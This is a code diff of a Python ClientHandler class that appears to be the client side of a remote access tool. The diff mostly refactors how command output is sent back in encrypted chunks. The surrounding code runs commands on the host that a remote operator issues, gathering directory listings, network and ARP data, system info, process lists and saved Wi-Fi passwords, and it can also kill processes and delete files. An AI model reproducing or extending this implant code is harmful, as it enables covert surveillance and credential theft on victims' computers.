@@ -345,7 +345,6 @@ class ClientHandler:
         except Exception as e:
             self.send(encrypt(f"Error decrypting file: {e}".encode()))
                 
-
     def authenticate(self, valid_user="test", valid_pass="test") -> bool:
         logged_in = False
         counter = 0
@@ -369,20 +368,12 @@ class ClientHandler:
     def send_data(self, data: bytes):
         encrypted = encrypt(data)
         chunks = to_chunks(encrypted)
-        self.send(encrypt(str(len(chunks)).encode()))
-        time.sleep(1)
-        for chunk in chunks:
-            self.send(chunk)
-            time.sleep(0.1)
-    def send_with_ack(self, data: bytes):
-        encrypted = encrypt(data)
-        chunks = to_chunks(encrypted)
         chunk_num = len(chunks)
         self.send(encrypt(str(len(chunks)).encode()))
         time.sleep(1)
         for chunk in range(chunk_num):
             self.send(chunks[chunk])
-            if self.recv().decode() == f"Chunk {chunk} received":
+            if decrypt(self.recv()).decode() == f"Chunk {chunk} received":
                 continue
             else:
                 break
@@ -402,7 +393,7 @@ class ClientHandler:
                         result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
 
                 elif cmd == "path":
                     if os_name=="Windows":
@@ -410,39 +401,39 @@ class ClientHandler:
                         self.send_data(current.encode())
                     else:
                         result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
-                        self.send_with_ack(result.encode())
+                        self.send_data(result.encode())
 
                 elif cmd == "ipconfig":
                     if os_name=="Windows":
                         result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
 
                 elif cmd == "arp -a":
                     result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
                 
                 elif cmd == "wifi-networks":
                     if os_name=="Windows":
                         result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = "Still unavailable on linux"
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
                 
                 elif cmd == "hostname":
                     if os_name=="Windows":
                         result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
                 
                 elif cmd == "ps":
                     if os_name=="Windows":
                         result = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ps aux", shell=True, capture_output=True, text=True).stdout
-                    self.send_with_ack(result.encode())
+                    self.send_data(result.encode())
                 
                 elif cmd.startswith("kill "):
                     try:
@@ -549,7 +540,7 @@ class ClientHandler:
                                 result = f"No password found for network: {wifi_network}"
                         except:
                             result = "Failed to retrieve WiFi password. May need sudo privileges."
-                    self.send_with_ack(result.encode())                    
+                    self.send_data(result.encode())                    
 
                 elif cmd.startswith("del "):
                     filename = cmd.split(" ", 1)[1]
